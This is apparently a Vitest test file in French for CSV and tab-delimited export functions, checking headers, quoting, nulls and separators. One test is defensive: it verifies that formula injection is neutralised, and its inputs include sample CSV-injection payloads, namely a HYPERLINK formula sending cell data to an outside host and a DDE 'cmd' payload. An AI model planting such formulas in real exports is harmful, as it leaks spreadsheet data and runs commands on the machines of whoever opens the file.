import { describe, it, expect } from "vitest";
import { versCsv, versDelimite } from "../exportCsv";

describe("versCsv", () => {
  const colonnes = [
    { label: "N°", valeur: (r) => r.num },
    { label: "Nom", valeur: (r) => r.nom },
    { label: "Montant", valeur: (r) => r.montant },
  ];
  const lignes = [
    { num: 1, nom: "BAKALA Thomas", montant: 150000 },
    { num: 2, nom: 'Cabinet "Loango"; SCPA', montant: 0 },
  ];

  it("génère un en-tête + lignes", () => {
    const csv = versCsv(colonnes, lignes);
    const rows = csv.split("\r\n");
    expect(rows[0]).toBe("N°;Nom;Montant");
    expect(rows[1]).toBe("1;BAKALA Thomas;150000");
  });

  it("échappe les valeurs contenant séparateur, guillemets ou point-virgule", () => {
    const csv = versCsv(colonnes, lignes);
    const rows = csv.split("\r\n");
    expect(rows[2]).toBe('2;"Cabinet ""Loango""; SCPA";0');
  });

  it("gère les valeurs nulles", () => {
    const csv = versCsv([{ label: "X", valeur: (r) => r.x }], [{ x: null }, { x: undefined }]);
    expect(csv.split("\r\n").slice(1)).toEqual(["", ""]);
  });
});

describe("versDelimite (TXT à tabulations)", () => {
  const colonnes = [
    { label: "A", valeur: (r) => r.a },
    { label: "B", valeur: (r) => r.b },
  ];

  it("produit en-tête + lignes séparés par tabulation et CRLF", () => {
    expect(versDelimite(colonnes, [{ a: 1, b: 2 }], "\t")).toBe("A\tB\r\n1\t2");
  });

  it("entoure de guillemets une valeur contenant une tabulation ou un retour à la ligne", () => {
    const txt = versDelimite(colonnes, [{ a: "x\ty", b: "l1\nl2" }], "\t");
    expect(txt.split("\r\n")[1]).toBe('"x\ty"\t"l1\nl2"');
  });

  it("n'échappe pas le point-virgule quand le séparateur est la tabulation", () => {
    expect(versDelimite(colonnes, [{ a: "Cabinet; SCPA", b: "" }], "\t").split("\r\n")[1]).toBe("Cabinet; SCPA\t");
  });

  it("versCsv équivaut à versDelimite avec « ; »", () => {
    const lignes = [{ a: 'Q"uote', b: "x;y" }];
    expect(versCsv(colonnes, lignes)).toBe(versDelimite(colonnes, lignes, ";"));
  });

  it("neutralise les formules (injection CSV) sans toucher aux téléphones ni aux nombres", () => {
    const col = [{ label: "v", valeur: (r) => r.v }];
    const sortie = (v) => versDelimite(col, [{ v }], ";").split("\r\n")[1];
    expect(sortie('=HYPERLINK("//x.tk/"&A1)')).toBe(`"'=HYPERLINK(""//x.tk/""&A1)"`);
    expect(sortie("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(sortie("+cmd|' /C calc'!A0")).toBe("'+cmd|' /C calc'!A0");
    expect(sortie("-1+HYPERLINK(1)")).toBe("'-1+HYPERLINK(1)");
    expect(sortie("+242 06 123 45 67")).toBe("+242 06 123 45 67");
    expect(sortie("+242-06-123-45-67")).toBe("+242-06-123-45-67");
    expect(sortie("+242/06/123")).toBe("+242/06/123");
    expect(sortie(-5000)).toBe("-5000");
    expect(sortie("2026-09-15")).toBe("2026-09-15");
  });
});
